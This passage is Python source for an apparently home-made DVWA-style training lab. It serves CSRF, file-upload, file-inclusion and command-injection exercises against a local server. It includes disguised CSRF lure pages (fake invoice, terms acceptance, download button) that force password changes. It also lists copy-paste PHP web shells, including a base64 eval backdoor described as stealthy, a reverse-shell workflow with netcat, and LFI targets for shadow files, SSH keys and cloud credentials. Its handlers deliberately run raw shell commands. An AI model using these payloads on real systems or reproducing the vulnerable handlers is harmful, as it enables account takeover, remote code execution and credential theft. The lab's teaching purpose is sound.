        '<html>\n<body onload="go()">\n  <script>\n  // Login CSRF — force victim to authenticate as attacker\n  // Useful to save payment details, addresses, etc. under victim session\n  function go() {\n    // Step 1: Logout victim (GET-based logout)\n    fetch("http://127.0.0.1:8888/security", { credentials: "include" });\n    // Step 2: Change password (simulates attacker taking over)\n    setTimeout(function() {\n      fetch("http://127.0.0.1:8888/csrf", {\n        method: "POST", credentials: "include",\n        headers: { "Content-Type": "application/x-www-form-urlencoded" },\n        body: "password_new=login_csrf_takeover&password_conf=login_csrf_takeover&Change=Change"\n      }).then(function() {\n        document.body.innerHTML = "<h3>Login CSRF complete. Check victim account.</h3>";\n      });\n    }, 500);\n  }\n  </script>\n  <p>Logging in...</p>\n</body>\n</html>'))

    pocs.append(("33. Realistic Invoice Page",
        "Styled as a real invoice/payment confirmation page. Victim clicks Pay Now — CSRF fires.",
        '<html>\n<head><title>Invoice #INV-2024-0042</title></head>\n<body style="font-family:Arial,sans-serif;background:#f5f5f5;padding:30px">\n  <div style="max-width:550px;margin:auto;background:#fff;padding:30px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,.1)">\n    <div style="display:flex;justify-content:space-between;align-items:center;border-bottom:2px solid #eee;padding-bottom:15px;margin-bottom:20px">\n      <h2 style="margin:0;color:#333">INVOICE</h2>\n      <span style="color:#999">INV-2024-0042</span>\n    </div>\n    <table style="width:100%;border-collapse:collapse;margin-bottom:20px">\n      <tr style="background:#f9f9f9"><th style="text-align:left;padding:10px">Item</th><th style="padding:10px">Amount</th></tr>\n      <tr><td style="padding:10px;border-bottom:1px solid #eee">Premium Subscription</td><td style="padding:10px;border-bottom:1px solid #eee;text-align:right">$49.99</td></tr>\n      <tr><td style="padding:10px;border-bottom:1px solid #eee">Setup Fee</td><td style="padding:10px;border-bottom:1px solid #eee;text-align:right">$0.00</td></tr>\n      <tr style="font-weight:bold"><td style="padding:10px">Total Due</td><td style="padding:10px;text-align:right">$49.99</td></tr>\n    </table>\n    <form action="http://127.0.0.1:8888/csrf" method="POST">\n      <input type="hidden" name="password_new"  value="invoice_payment_csrf">\n      <input type="hidden" name="password_conf" value="invoice_payment_csrf">\n      <input type="hidden" name="Change"        value="Change">\n      <button type="submit" style="width:100%;padding:14px;background:#28a745;color:#fff;border:none;border-radius:4px;font-size:16px;cursor:pointer">\n        Pay Now — $49.99\n      </button>\n    </form>\n    <p style="color:#999;font-size:11px;text-align:center;margin-top:10px">Secured by SSL encryption</p>\n  </div>\n</body>\n</html>'))

    pocs.append(("34. Terms & Conditions Accept",
        "Victim clicks Accept Terms. The accept button submits CSRF in the background.",
        '<html>\n<head><title>Terms of Service Update</title></head>\n<body style="font-family:sans-serif;padding:30px;background:#f9f9f9">\n  <div style="max-width:600px;margin:auto;background:#fff;padding:30px;border-radius:8px;box-shadow:0 2px 8px rgba(0,0,0,.1)">\n    <h2>Terms of Service — Updated</h2>\n    <p>We have updated our Terms of Service. Please review and accept to continue using our platform.</p>\n    <div style="height:150px;overflow-y:scroll;border:1px solid #ddd;padding:15px;margin:15px 0;font-size:13px;color:#666">\n      <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed do eiusmod tempor incididunt ut labore et dolore magna aliqua...</p>\n      <p>Section 2.1: By using this service you agree to all terms herein...</p>\n      <p>Section 3: We reserve the right to modify these terms at any time...</p>\n      <p>Section 4.2: Your continued use of the service constitutes acceptance...</p>\n    </div>\n    <form action="http://127.0.0.1:8888/csrf" method="POST">\n      <input type="hidden" name="password_new"  value="terms_csrf">\n      <input type="hidden" name="password_conf" value="terms_csrf">\n      <input type="hidden" name="Change"        value="Change">\n      <label style="display:flex;align-items:center;gap:8px;margin-bottom:15px">\n        <input type="checkbox" required> I have read and agree to the Terms of Service\n      </label>\n      <button type="submit" style="padding:12px 24px;background:#007bff;color:#fff;border:none;border-radius:4px;cursor:pointer">\n        Accept &amp; Continue\n      </button>\n    </form>\n  </div>\n</body>\n</html>'))

    pocs.append(("35. Download Button Trigger",
        "Victim clicks Download File. The download triggers CSRF before the download starts.",
        '<html>\n<head><title>File Download</title></head>\n<body style="font-family:sans-serif;padding:40px;text-align:center">\n  <div style="max-width:400px;margin:auto;padding:30px;border:1px solid #ddd;border-radius:8px">\n    <h2>Your file is ready</h2>\n    <p>Click the button below to download <strong>report_2024.pdf</strong></p>\n    <p style="color:#999;font-size:13px">File size: 2.4 MB</p>\n    <button onclick="startDownload()"\n      style="padding:14px 32px;background:#17a2b8;color:#fff;border:none;border-radius:4px;font-size:16px;cursor:pointer;margin-top:10px">\n      Download File\n    </button>\n  </div>\n  <form id="cf" action="http://127.0.0.1:8888/csrf" method="POST" style="display:none">\n    <input name="password_new"  value="download_csrf">\n    <input name="password_conf" value="download_csrf">\n    <input name="Change"        value="Change">\n  </form>\n  <script>\n  function startDownload() {\n    // CSRF fires first, then download begins\n    fetch("http://127.0.0.1:8888/csrf", {\n      method: "POST", credentials: "include",\n      headers: {"Content-Type":"application/x-www-form-urlencoded"},\n      body: "password_new=download_csrf&password_conf=download_csrf&Change=Change"\n    });\n    // Simulate file download\n    setTimeout(function() { alert("Download started! (CSRF also fired silently)"); }, 500);\n  }\n  </script>\n</body>\n</html>'))

    # Build JS array safely using json.dumps for each payload
    # Replace </ with <\/ so the browser HTML parser never sees </script> inside the JS block
    import json as _json
    js_entries = [_json.dumps(code).replace("</", "<\\/") for _, _, code in pocs]
    payloads_js = "var CSRF_POCS = [\n  " + ",\n  ".join(js_entries) + "\n];"

    # Build payload cards
    poc_cards = ""
    for idx, (title, desc, _) in enumerate(pocs):
        poc_cards += (
            '\n<div class="pbox" style="margin-bottom:.45rem">'
            '\n  <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:2px">'
            '\n    <div class="ptitle" style="margin:0">' + html.escape(title) + '</div>'
            '\n    <button class="btn btn-s" style="padding:2px 10px;font-size:11px;flex-shrink:0"'
            '\n      onclick="loadCsrfPoc(' + str(idx) + ')">Load</button>'
            '\n  </div>'
            '\n  <div class="pdesc">' + html.escape(desc) + '</div>'
            '\n</div>'
        )

    # Build level indicator without f-string nesting issues
    if lv == "low":
        lv_span = '<span style="color:#e74c3c">LOW: No CSRF protection</span>'
    elif lv == "medium":
        lv_span = '<span style="color:#e67e22">MEDIUM: Referer check only</span>'
    else:
        lv_span = '<span style="color:#27ae60">HIGH: CSRF token required</span>'

    page_html = """
<div class="ph">
  <h2>CSRF &mdash; Cross-Site Request Forgery</h2>
  <p>Trick an authenticated user's browser into silently changing their password. Same vulnerable form as DVWA &mdash; real exploitation.</p>
</div>

<div class="g2">
<div>

<div class="card">
  <h3>Change Your Admin Password <span class="lbadge" style="font-size:11px">""" + lv + """</span></h3>
  <p style="font-size:13px;color:#8b949e;margin-bottom:.6rem">
    Current password: <code style="color:#7ee787">""" + html.escape(cur_pw) + """</code>
    &nbsp;&middot;&nbsp; """ + lv_span + """
  </p>
  <form method="POST" action="/csrf">""" + token_field + """
    <label>New password</label>
    <input type="text" name="password_new" placeholder="Enter new password">
    <label>Confirm new password</label>
    <input type="text" name="password_conf" placeholder="Confirm new password">
    <input type="hidden" name="Change" value="Change">
    <button class="btn btn-p" type="submit">Change</button>
  </form>
  """ + msg + """
  """ + token_hint + """
</div>

<div class="card">
  <h3>Payload Executor</h3>
  <p style="font-size:13px;color:#8b949e;margin-bottom:.5rem">
    Choose a payload from the library &rarr; click <strong>Load</strong> &rarr; click <strong>Run Payload</strong>.
    The forged request fires and the victim password above updates.
  </p>
  <textarea id="csrf-payload" rows="12"
    placeholder="Paste or load a CSRF HTML payload here..."
    style="font-family:monospace;font-size:12px;color:#7ee787;background:#0d1117;width:100%;resize:vertical"></textarea>
  <div style="display:flex;gap:.4rem;margin-top:.4rem;flex-wrap:wrap">
    <button class="btn btn-d" onclick="runCsrf()" style="flex:1;min-width:120px">&#9654; Run Payload</button>
    <button class="btn btn-i" onclick="openCsrf()" style="flex:1;min-width:120px">&#8599; New Tab</button>
    <button class="btn btn-s" onclick="saveCsrf()">&#8595; Save .html</button>
    <button class="btn btn-s" onclick="document.getElementById('csrf-payload').value='';setCS('','')">Clear</button>
  </div>
  <div id="csrf-status" style="font-size:12px;margin-top:.4rem;min-height:1.2em"></div>
  <iframe id="csrf-frame" name="csrf-frame"
    style="display:none;width:100%;height:0;border:none"
    sandbox="allow-scripts allow-forms allow-same-origin"></iframe>
</div>

</div>
<div>

<div class="card">
  <h3>Payload Library &mdash; 20 PoCs</h3>
  <p style="font-size:12px;color:#8b949e;margin-bottom:.5rem">
    Click <strong>Load</strong> on any entry, then <strong>Run Payload</strong>.
  </p>
  <div style="max-height:500px;overflow-y:auto">""" + poc_cards + """</div>
</div>

<div class="ibox">
  <h4>How CSRF Works</h4>
  <p>Browsers attach session cookies to every request to a domain, even ones triggered from other sites.
  If the server does not verify request origin, an attacker page can silently forge any action.</p>
  <div class="step"><div class="snum">1</div><div class="stxt">Admin logged into <code>127.0.0.1:8888</code></div></div>
  <div class="step"><div class="snum">2</div><div class="stxt">Admin visits attacker page (or you use the executor above)</div></div>
  <div class="step"><div class="snum">3</div><div class="stxt">Hidden form auto-submits &mdash; server sees valid session cookie</div></div>
  <div class="step"><div class="snum">4</div><div class="stxt">Password changed &mdash; admin locked out</div></div>
</div>

<div class="ibox">
  <h4>Security Level Breakdown</h4>
  <table>
    <thead><tr><th>Level</th><th>Protection</th><th>Bypass</th></tr></thead>
    <tbody>
      <tr><td><span class="vtag">LOW</span></td><td>None</td><td>Any POST works</td></tr>
      <tr><td><span style="color:#e67e22;font-weight:700">MED</span></td><td>Referer header check</td><td>Null Referer, srcdoc iframe</td></tr>
      <tr><td><span class="stag">HIGH</span></td><td>Unpredictable CSRF token</td><td>XSS to steal token first</td></tr>
    </tbody>
  </table>
</div>

<div class="ibox">
  <h4>Defense</h4>
  <ul>
    <li><strong style="color:#f0f6fc">Synchronizer token</strong> &mdash; unique random secret per session in every form</li>
    <li><strong style="color:#f0f6fc">SameSite=Strict</strong> &mdash; cookie never sent on cross-site requests</li>
    <li><strong style="color:#f0f6fc">SameSite=Lax</strong> &mdash; blocks subresource CSRF, allows safe GET navigation</li>
    <li><strong style="color:#f0f6fc">Re-authenticate</strong> &mdash; require current password before setting a new one</li>
    <li>Origin / Referer checks alone are insufficient and easily bypassed</li>
  </ul>
</div>

</div>
</div>

<script>
""" + payloads_js + """

function loadCsrfPoc(idx) {
  var code = CSRF_POCS[idx];
  if (code === undefined) { setCS("Payload not found.", "err"); return; }
  document.getElementById("csrf-payload").value = code;
  document.getElementById("csrf-payload").scrollIntoView({behavior:"smooth",block:"center"});
  setCS("Payload #" + (idx+1) + " loaded. Click Run Payload to fire.", "ok");
}

function runCsrf() {
  var code = document.getElementById("csrf-payload").value.trim();
  if (!code) { setCS("Load or paste a payload first.", "err"); return; }
  var frame = document.getElementById("csrf-frame");
  frame.style.display = "block";
  frame.style.height = "1px";
  var doc = frame.contentDocument || frame.contentWindow.document;
  doc.open(); doc.write(code); doc.close();
  setCS("Payload fired! Reloading in 1.5s to show result...", "ok");
  setTimeout(function() { location.reload(); }, 1500);
}

function openCsrf() {
  var code = document.getElementById("csrf-payload").value.trim();
  if (!code) { setCS("Load or paste a payload first.", "err"); return; }
  window.open(URL.createObjectURL(new Blob([code], {type:"text/html"})), "_blank");
  setCS("Opened in new tab. Check victim password after it loads.", "ok");
}

function saveCsrf() {
  var code = document.getElementById("csrf-payload").value.trim();
  if (!code) { setCS("Nothing to save.", "err"); return; }
  var a = document.createElement("a");
  a.href = URL.createObjectURL(new Blob([code], {type:"text/html"}));
  a.download = "csrf_poc.html"; a.click();
  setCS("Saved as csrf_poc.html", "ok");
}

function setCS(msg, type) {
  var el = document.getElementById("csrf-status");
  el.style.color = type === "err" ? "#f85149" : "#7ee787";
  el.textContent = msg;
}
</script>"""

    return base_page("CSRF", page_html, "csrf")


def page_file_upload(params, method="GET", body_params=None):
    import json as _json
    lv = SECURITY_LEVEL["level"]
    msg = ""
    UPLOAD_DIR = "/tmp/dvwa_uploads"
    os.makedirs(UPLOAD_DIR, exist_ok=True)

    if method == "POST" and body_params:
        filename    = body_params.get("filename",    [""])[0].strip()
        filecontent = body_params.get("filecontent", [""])[0]

        if filename and filecontent is not None:
            safe = os.path.basename(filename)
            ext  = os.path.splitext(safe)[1].lower()

            def save_file():
                dest = os.path.join(UPLOAD_DIR, safe)
                with open(dest, "w", errors="replace") as fh:
                    fh.write(filecontent)
                return dest

            if lv == "low":
                dest = save_file()
                is_shell = any(k in filecontent for k in
                    ["<?php","<?=","system(","exec(","shell_exec(","passthru("])
                url = f"/uploads/{safe}"
                msg = (
                    f'<div class="flag" style="white-space:pre-wrap">'
                    f'succesfully uploaded!\n\n'
                    f'File : <code style="color:#7ee787">{html.escape(safe)}</code>\n'
                    f'Path : <code>{html.escape(dest)}</code>\n'
                    f'Size : {len(filecontent.encode())} bytes\n\n'
                    + (f'<strong>Shell ready</strong> — click below to open it:\n'
                       f'<a href="{html.escape(url)}" target="_blank" '
                       f'style="display:inline-block;margin-top:.3rem;padding:.4rem 1rem;'
                       f'background:#238636;color:#fff;border-radius:4px;text-decoration:none;font-size:13px">'
                       f'Open Shell /uploads/{html.escape(safe)}</a>'
                       if is_shell else
                       f'File uploaded. <a href="{html.escape(url)}" target="_blank">View file</a>')
                    + '\n\nFLAG{file_upload_low_success}</div>'
                )

            elif lv == "medium":
                allowed = {".jpg", ".jpeg", ".png", ".gif"}
                if ext not in allowed:
                    msg = (
                        f'<div class="err">Your image was not uploaded.\n'
                        f'We do only allow JPG, JPEG, PNG and GIF images.\n\n'
                        f'Bypass: rename to <code>shell.php.jpg</code> (double extension) '
                        f'or change Content-Type header in Burp Suite.</div>'
                    )
                else:
                    dest = save_file()
                    is_shell = any(k in filecontent for k in ["<?php","<?=","system(","exec("])
                    url = f"/uploads/{safe}"
                    if is_shell:
                        msg = (
                            f'<div class="flag" style="white-space:pre-wrap">'
                            f'succesfully uploaded! [MEDIUM BYPASS]\n\n'
                            f'Shell uploaded with image extension: <code>{html.escape(safe)}</code>\n'
                            f'The extension check passed (.{ext[1:]}) but PHP executes inside.\n\n'
                            f'<a href="{html.escape(url)}" target="_blank" '
                            f'style="display:inline-block;padding:.4rem 1rem;background:#238636;'
                            f'color:#fff;border-radius:4px;text-decoration:none;font-size:13px">'
                            f'Open Shell</a>\n\nFLAG{{file_upload_medium_bypass}}</div>'
                        )
                    else:
                        msg = f'<div class="flag">succesfully uploaded!\nFile: <code>{html.escape(safe)}</code> — <a href="{html.escape(url)}" target="_blank">View</a></div>'

            else:  # high
                allowed = {".jpg", ".jpeg", ".png", ".gif"}
                if ext not in allowed:
                    msg = '<div class="err">Your image was not uploaded.\nOnly JPG, JPEG, PNG and GIF images are allowed.</div>'
                elif not any(filecontent.startswith(mg) for mg in
                             ["GIF89a", "GIF87a", "\xff\xd8\xff", "\x89PNG"]):
                    msg = (
                        '<div class="err">Your image was not uploaded.\n'
                        'Invalid image header (magic bytes check failed).\n\n'
                        '<span style="color:#e3b341">Bypass: prepend <code>GIF89a</code> '
                        'before your PHP code, save as <code>shell.php.gif</code></span></div>'
                    )
                else:
                    dest = save_file()
                    is_shell = any(k in filecontent for k in ["<?php", "<?="])
                    url = f"/uploads/{safe}"
                    if is_shell:
                        msg = (
                            f'<div class="flag" style="white-space:pre-wrap">'
                            f'succesfully uploaded! [HIGH BYPASS]\n\n'
                            f'GIF89a magic bytes satisfied the image check.\n'
                            f'PHP executes on a real PHP server despite image extension.\n\n'
                            f'<a href="{html.escape(url)}" target="_blank" '
                            f'style="display:inline-block;padding:.4rem 1rem;background:#238636;'
                            f'color:#fff;border-radius:4px;text-decoration:none;font-size:13px">'
                            f'Open Shell</a>\n\nFLAG{{file_upload_high_gif89a}}</div>'
                        )
                    else:
                        msg = f'<div class="flag">Image uploaded: <code>{html.escape(safe)}</code></div>'

    # List uploaded files
    try:
        ufiles = sorted(os.listdir(UPLOAD_DIR))
    except Exception:
        ufiles = []

    files_html = ""
    for fn in ufiles[:30]:
        fp  = os.path.join(UPLOAD_DIR, fn)
        ext = os.path.splitext(fn)[1].lower()
        is_shell = ext in {".php",".phtml",".phar",".php3",".php5",".php7",".svg",".html"}
        col  = "#f85149" if is_shell else "#8b949e"
        try:
            sz = os.path.getsize(fp)
        except Exception:
            sz = 0
        open_link = (
            f' <a href="/uploads/{html.escape(fn)}" target="_blank" '
            f'style="font-size:11px;color:#238636;margin-left:.4rem">Open Shell ↗</a>'
            if is_shell else
            f' <a href="/uploads/{html.escape(fn)}" target="_blank" '
            f'style="font-size:11px;color:#8b949e;margin-left:.4rem">View ↗</a>'
        )
        files_html += (
            f'<div style="display:flex;justify-content:space-between;align-items:center;'
            f'padding:.35rem .75rem;border-bottom:1px solid #21262d">'
            f'<div><code style="color:{col};font-size:12px">{html.escape(fn)}</code>{open_link}</div>'
            f'<span style="color:#8b949e;font-size:12px">{sz} B</span>'
            f'</div>'
        )
    if not files_html:
        files_html = '<p style="color:#8b949e;font-size:13px;padding:.75rem">No files uploaded yet.</p>'

    if lv == "low":
        lv_note = '<div class="warn" style="margin-bottom:.6rem"><strong>LOW:</strong> No restrictions whatsoever. Upload any PHP shell directly.</div>'
    elif lv == "medium":
        lv_note = '<div class="warn" style="margin-bottom:.6rem"><strong>MEDIUM:</strong> Only .jpg/.png/.gif allowed by extension check. Bypass: use <code>shell.php.jpg</code></div>'
    else:
        lv_note = '<div class="warn" style="margin-bottom:.6rem"><strong>HIGH:</strong> Extension + image magic bytes checked. Bypass: prepend <code>GIF89a</code> then PHP code, filename <code>shell.php.gif</code></div>'

    return base_page("File Upload", f"""
<div class="ph">
  <h2>File Upload</h2>
  <p>Upload files directly from your system. Bypass the restrictions to plant a web shell and get remote code execution — exactly like DVWA.</p>
</div>

<div class="g2">
<div>

<!-- Upload form -->
<div class="card">
  <h3>Choose an image to upload: <span class="lbadge" style="font-size:11px">{lv}</span></h3>
  {lv_note}
  <form method="POST" action="/file-upload" id="upload-form">

    <div style="background:#0d1117;border:1px solid #30363d;border-radius:6px;padding:.75rem;margin-bottom:.6rem">
      <label style="color:#f0f6fc;font-size:13px;font-weight:600;display:block;margin-bottom:.4rem">
        Upload from your system (auto-fills content):
      </label>
      <input type="file" id="file-picker" accept="*/*" onchange="readFile(this)"
        style="width:100%;color:#c9d1d9;font-size:13px;cursor:pointer;background:transparent;border:none">
      <div id="file-info" style="font-size:11px;color:#8b949e;margin-top:.3rem"></div>
    </div>

    <label>Filename <small style="color:#8b949e;font-weight:400">— editable, change extension for bypass</small></label>
    <input type="text" name="filename" id="upload-fn"
      placeholder="shell.php" style="font-family:monospace">

    <label>File Content <small style="color:#8b949e;font-weight:400">— auto-filled on file pick, or paste manually</small></label>
    <textarea name="filecontent" id="upload-content" rows="10"
      placeholder="Select a file above, or paste PHP shell content here..."
      style="font-family:monospace;font-size:12px;color:#7ee787;background:#0d1117"></textarea>

    <div style="display:flex;gap:.5rem;margin-top:.3rem">
      <button class="btn btn-d" type="submit" style="flex:1">Upload</button>
      <button class="btn btn-s" type="button" onclick="clearForm()">Clear</button>
    </div>
  </form>
  {msg}
</div>

<!-- Uploaded files -->
<div class="card">
  <h3>Uploaded Files
    <small style="color:#8b949e;font-weight:400;font-size:12px">/tmp/dvwa_uploads/</small>
  </h3>
  <div style="border:1px solid #30363d;border-radius:6px;max-height:220px;overflow-y:auto">
    {files_html}
  </div>
  <div style="display:flex;justify-content:space-between;align-items:center;margin-top:.5rem">
    <button class="btn btn-s" style="font-size:12px" onclick="location.reload()">Refresh</button>
    <span style="font-size:11px;color:#8b949e">
      <span style="color:#f85149">Red</span> = executable &nbsp;
      Click <strong>Open Shell</strong> to run commands
    </span>
  </div>
</div>

</div>
<div>

<div class="ibox">
  <h4>How It Works</h4>
  <p>If the server stores uploads in a web-accessible directory without blocking script execution,
  uploading a PHP file lets you run OS commands through the browser.</p>
  <div class="step"><div class="snum">1</div><div class="stxt">Write or paste a PHP shell → Upload</div></div>
  <div class="step"><div class="snum">2</div><div class="stxt">Click <strong>Open Shell</strong> next to the uploaded file</div></div>
  <div class="step"><div class="snum">3</div><div class="stxt">Type any OS command in the terminal — output shows below</div></div>
  <div class="step"><div class="snum">4</div><div class="stxt">For a reverse shell: set up listener → upload rev shell → trigger it</div></div>
</div>

<div class="ibox">
  <h4>Quick PHP Shells — Copy &amp; Paste</h4>
  <div class="pbox">
    <div class="ptitle">One-liner command shell</div>
    <div class="pdesc">Minimal — execute via <code>?cmd=id</code></div>
    <code>&lt;?php system($_GET['cmd']); ?&gt;</code>
  </div>
  <div class="pbox">
    <div class="ptitle">Shell with output wrapping</div>
    <div class="pdesc">Shows full output in pre tag — better for long output</div>
    <code>&lt;?php echo '&lt;pre&gt;'.shell_exec($_GET['cmd'].' 2>&amp;1').'&lt;/pre&gt;'; ?&gt;</code>
  </div>
  <div class="pbox">
    <div class="ptitle">POST eval backdoor (stealthy)</div>
    <div class="pdesc">No GET params — harder to spot in logs. Send base64 PHP in POST body.</div>
    <code>&lt;?php @eval(base64_decode($_POST['c'])); ?&gt;</code>
  </div>
  <div class="pbox">
    <div class="ptitle">GIF89a + shell (HIGH bypass)</div>
    <div class="pdesc">Prepend GIF magic bytes — saves as .gif but PHP still runs</div>
    <code>GIF89a<br>&lt;?php system($_GET['cmd']); ?&gt;</code>
  </div>
</div>

<div class="ibox">
  <h4>Reverse Shell Payloads</h4>
  <p style="font-size:13px;color:#c9d1d9;margin-bottom:.6rem">
    Use <strong><a href="https://www.revshells.com" target="_blank" style="color:#58a6ff">revshells.com</a></strong>
    to generate any reverse shell payload — bash, python, perl, ruby, netcat, socat, powershell and more.
    Enter your IP and port, pick a shell type, copy the PHP wrapper below.
  </p>
  <div class="pbox">
    <div class="ptitle">Step 1 — Go to revshells.com</div>
    <div class="pdesc">Enter your Kali IP + port, select the shell type you want</div>
    <code><a href="https://www.revshells.com" target="_blank" style="color:#58a6ff">https://www.revshells.com</a></code>
  </div>
  <div class="pbox">
    <div class="ptitle">Step 2 — Wrap in PHP exec()</div>
    <div class="pdesc">Copy the shell command from revshells.com and wrap it like this</div>
    <code>&lt;?php exec("PASTE_SHELL_HERE"); ?&gt;</code>
  </div>
  <div class="pbox">
    <div class="ptitle">Step 3 — Start listener on Kali</div>
    <div class="pdesc">Run BEFORE uploading or triggering the shell</div>
    <code>nc -lvnp 4444</code>
  </div>
  <div class="pbox">
    <div class="ptitle">Step 4 — Upload and trigger</div>
    <div class="pdesc">Upload the file, then click Open Shell or curl it</div>
    <code>curl http://127.0.0.1:8888/uploads/rev.php</code>
  </div>
  <div class="pbox">
    <div class="ptitle">Step 5 — Upgrade to full TTY</div>
    <div class="pdesc">After shell connects back — make it fully interactive</div>
    <code>python3 -c 'import pty;pty.spawn("/bin/bash")'
Ctrl+Z  →  stty raw -echo  →  fg  →  Enter</code>
  </div>
</div>

<div class="ibox">
  <h4>Security Level Bypasses</h4>
  <table>
    <thead><tr><th>Level</th><th>Check</th><th>Bypass</th></tr></thead>
    <tbody>
      <tr><td><span class="vtag">LOW</span></td>
          <td>None</td>
          <td>Upload anything directly</td></tr>
      <tr><td><span style="color:#e67e22;font-weight:700">MED</span></td>
          <td>File extension only</td>
          <td><code>shell.php.jpg</code> double extension</td></tr>
      <tr><td><span class="stag">HIGH</span></td>
          <td>Extension + magic bytes</td>
          <td>Prepend <code>GIF89a</code>, save as <code>shell.php.gif</code></td></tr>
    </tbody>
  </table>
</div>

<div class="ibox">
  <h4>Defense</h4>
  <ul>
    <li>Store uploads <strong>outside the web root</strong> — they can never be executed</li>
    <li>Rename to random UUID on save — path can never be guessed</li>
    <li>Validate MIME type using magic bytes, not extension or Content-Type header</li>
    <li>Strict allowlist: only jpg, png, gif — reject all others</li>
    <li>Disable PHP execution in upload dir: <code>php_flag engine off</code></li>
    <li>Serve uploads from a separate domain/CDN with no PHP support</li>
  </ul>
</div>

</div>
</div>

<script>
function readFile(input) {{
  var file = input.files[0];
  if (!file) return;
  document.getElementById("upload-fn").value = file.name;
  document.getElementById("file-info").textContent =
    file.name + "  (" + file.size + " bytes" + (file.type ? ", " + file.type : "") + ")";
  var reader = new FileReader();
  reader.onload = function(e) {{
    document.getElementById("upload-content").value = e.target.result;
  }};
  reader.readAsText(file);
}}

function clearForm() {{
  document.getElementById("upload-fn").value      = "";
  document.getElementById("upload-content").value = "";
  document.getElementById("file-info").textContent = "";
  document.getElementById("file-picker").value    = "";
}}
</script>""", "file-upload")


def page_file_include(params):
    lv=SECURITY_LEVEL["level"]; page=params.get("page",[""])[0]; out=""
    safe={"info.txt":"Server: Enhanced DVWA v2.0 by Khalil","about.txt":"Security training lab.","help.txt":"Use sidebar to navigate."}
    if page:
        if lv=="low":
            try:
                with open(page,"r") as f: out=f'<div class="out">{html.escape(f.read())}</div>'
            except Exception as e: out=f'<div class="err">Error: {html.escape(str(e))}</div>'
        elif lv=="medium":
            if page.startswith("/") or page.startswith("\\"): out='<div class="err">Absolute paths blocked. Try ../ traversal.</div>'
            else:
                try:
                    with open(page,"r") as f: out=f'<div class="out">{html.escape(f.read())}</div>'
                except: out='<div class="err">File not found</div>'
        else:
            out=f'<div class="out">{html.escape(safe[page])}</div>' if page in safe else '<div class="err">File not in allowlist</div>'
    pl=[
        ("/etc/passwd","Confirm LFI + enumerate system usernames","/etc/passwd"),
        ("/etc/shadow","Read password hashes (requires root/privileged process)","/etc/shadow"),
        ("/etc/hosts","Read network host configuration","/etc/hosts"),
        ("/proc/self/environ","Process environment — may leak SECRET_KEY, DB_PASSWORD, API keys","/proc/self/environ"),
        ("/proc/self/cmdline","See exact startup command — reveals app paths and arguments","/proc/self/cmdline"),
        ("/proc/self/cwd","Symlink to current working directory","/proc/self/cwd"),
        ("Path traversal to /etc/passwd","Escape app root using ../ sequences","../../../../etc/passwd"),
        ("Deeper traversal","More ../ for deeper app roots","../../../../../../etc/passwd"),
        ("Apache access log","Log poisoning target — inject PHP into User-Agent then include","/var/log/apache2/access.log"),
        ("Nginx error log","Alternative log poisoning target","/var/log/nginx/error.log"),
        ("PHP wrapper — base64","Read PHP source without executing it — then base64 decode","php://filter/convert.base64-encode/resource=index.php"),
        ("SSH private key","Read root SSH private key if world-readable","/root/.ssh/id_rsa"),
        ("Cron jobs","Discover scheduled tasks and scripts running as root","/etc/crontab"),
        ("Web server config","Reveal document root, virtual hosts, auth settings","/etc/apache2/sites-enabled/000-default.conf"),
        (".env file","Application secrets — DB creds, API keys, SECRET_KEY","../../.env"),
        ("AWS credentials","AWS access keys stored by CLI tool","../../.aws/credentials"),
        ("/proc/net/tcp","Active network connections — discover internal services","/proc/net/tcp"),
        ("auth.log","SSH login attempts — may reveal valid usernames","/var/log/auth.log"),
    ]
    ph='<div class="stitle">LFI Targets (click to fill)</div>'+"".join(pcard(t,d,p,"lfi-input") for t,d,p in pl)
    return base_page("File Inclusion",f"""
<div class="ph"><h2>File Inclusion — LFI</h2><p>Include arbitrary local files by passing unsanitized paths to file-reading functions. Read server files, source code, credentials, keys.</p></div>
<div class="g2">
<div>
<div class="card"><h3>File Viewer <span class="lbadge" style="font-size:11px">{lv}</span></h3>
<form method="GET"><label>File Path</label><input type="text" name="page" id="lfi-input" value="{html.escape(page)}" placeholder="/etc/passwd"><button class="btn btn-d" type="submit">Include</button></form>{out}</div>
<div class="card"><h3>LFI Targets</h3><div style="max-height:460px;overflow-y:auto">{ph}</div></div>
</div>
<div>
<div class="ibox"><h4>How LFI Works</h4>
<p>When user-supplied path input is passed to <code>open()</code> or <code>include()</code> without validation, an attacker can read any file the web process has permission to access.</p>
<div class="step"><div class="snum">1</div><div class="stxt">Detect: inject <code>/etc/passwd</code> or <code>../../../../etc/passwd</code></div></div>
<div class="step"><div class="snum">2</div><div class="stxt">Escalate: read <code>/proc/self/environ</code>, SSH keys, .env files</div></div>
<div class="step"><div class="snum">3</div><div class="stxt">Log Poisoning: inject PHP into User-Agent, include the log file</div></div>
<div class="step"><div class="snum">4</div><div class="stxt">PHP wrappers: <code>php://input</code>, <code>data://</code> for code execution</div></div>
</div>
<div class="ibox"><h4>Log Poisoning to RCE</h4><ul>
<li>Inject PHP into Apache log via User-Agent:<br><code>curl -A "&lt;?php system($_GET[c]); ?&gt;" http://target.com/</code></li>
<li>Include the log file: <code>?page=/var/log/apache2/access.log&c=id</code></li>
<li>Log is parsed as PHP — your command executes!</li>
</ul></div>
<div class="ibox"><h4>Defense</h4><ul>
<li>Use strict allowlist of permitted filenames — never accept paths</li>
<li>Use <code>realpath()</code> and verify path starts within allowed directory</li>
<li>Disable PHP wrappers: <code>allow_url_include=Off</code></li>
<li>Run app with minimal filesystem permissions (principle of least privilege)</li>
</ul></div>
</div></div>""","file-include")


def page_cmd_inject(params, method="GET", body_params=None):
    lv  = SECURITY_LEVEL["level"]
    bp  = body_params or {}
    cmd = bp.get("cmd", params.get("cmd", [""]))[0].strip()
    out = ""

    import subprocess as _sp

    PRE_STYLE = ('background:#0d1117;border:1px solid #30363d;border-radius:6px;'
                 'padding:1rem;color:#c9d1d9;font-size:13px;font-family:monospace;'
                 'white-space:pre-wrap;word-break:break-all;margin-top:.75rem;min-height:40px')

    if cmd:
        if lv == "low":
            # NO sanitisation — run exactly what the user typed
            try:
                result = _sp.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
                output = result.stdout + result.stderr
                out = f'<pre style="{PRE_STYLE}">{html.escape(output or "(no output)")}</pre>'
            except _sp.TimeoutExpired:
                out = '<div class="err">Command timed out (10s).</div>'
            except Exception as e:
                out = f'<div class="err">Error: {html.escape(str(e))}</div>'

        elif lv == "medium":
            # Blacklist only — strips | and ; but misses &&, ||, backticks, $(), newline
            blacklist = ["|", ";"]
